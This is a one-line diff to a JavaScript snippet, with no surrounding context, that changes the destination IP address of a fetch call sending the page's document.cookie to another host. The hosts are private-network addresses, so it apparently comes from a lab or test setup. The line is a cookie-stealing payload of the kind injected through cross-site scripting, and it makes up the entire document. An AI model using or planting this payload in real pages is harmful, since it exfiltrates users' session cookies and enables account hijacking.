@@ -1,1 +1,1 @@
-fetch('http://10.0.2.7?cookie=' + document.cookie);
+fetch('http://192.168.1.14?cookie=' + document.cookie);
